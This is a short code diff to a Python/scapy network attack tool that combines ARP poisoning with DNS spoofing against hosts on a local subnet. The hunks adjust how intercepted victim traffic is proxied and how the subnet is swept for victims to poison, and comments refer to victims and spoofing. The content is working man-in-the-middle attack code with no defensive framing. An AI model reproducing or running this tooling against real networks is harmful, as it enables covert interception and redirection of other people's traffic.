@@ -22,9 +22,6 @@ def isDnsResponse(packet):
 
 #all non dns packets need to be proxied, else the arp poisoning cuts them off the internet
 def proxy(packet):
-    if isDnsResponse(packet):
-        return    
-    
     if packet[scapy.IP].dst in victim_addresses.keys():
         #needs to go to client
         packet[scapy.Ether].dst = arp_spoofing.get_mac(packet[scapy.IP].dst) 
@@ -34,7 +31,7 @@ def proxy(packet):
     else :
         return
 
-    scapy.sendp(packet, verbose=0)
+    scapy.sendp(packet, verbose=0, iface=iface)
 
 #todo client doesnt seem to take this as answer even when cut off from internet
 def dns_spoof(packet):
@@ -108,7 +105,7 @@ def arp_prep_automated(silent = False, iface_ = "enp0s10") :
     subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
     router_ip = subnet + '.1' #usually router is at subnet .1
 
-    for i in range(1,255) :  # ips in subnet
+    for i in range(1,10) :  # ips in subnet, should be (1, 255)
         ip = subnet + "." + str(i)
         try :
             victim_addresses[ip] = arp_spoofing.get_mac(ip) #exists
